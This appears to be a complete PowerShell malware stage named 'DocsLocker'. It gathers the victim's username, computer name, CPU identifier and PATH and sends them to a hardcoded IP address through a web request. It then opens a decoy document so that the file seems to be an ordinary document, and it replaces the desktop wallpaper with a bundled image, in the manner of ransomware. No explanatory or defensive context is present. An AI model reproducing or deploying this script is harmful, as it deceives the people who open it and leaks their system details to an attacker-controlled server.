cd "${env:appdata}\\DocsLocker"

$username = $env:username
$computername = $env:computername
$cpu = $env:processor_identifier
$path = $env:path

Invoke-WebRequest -UseBasicParsing -Uri "http://89.221.217.68/DocsLocker/hello.php?username=${username}&computername=${computername}&cpu=${cpu}&path=${path}"

# open PDF, just like it was an ordinary PDF
Start-Process document.doc

# source: https://stackoverflow.com/questions/43187787/change-wallpaper-powershell
$image = "${env:appdata}\DocsLocker\background.bmp"
echo $image
$setwallpapersrc = @"
using System.Runtime.InteropServices;
public class wallpaper
{
public const int SetDesktopWallpaper = 20;
public const int UpdateIniFile = 0x01;
public const int SendWinIniChange = 0x02;
[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
public static void SetWallpaper ( string path )
{
SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
}
}
"@
Add-Type -TypeDefinition $setwallpapersrc
[wallpaper]::SetWallpaper($image) 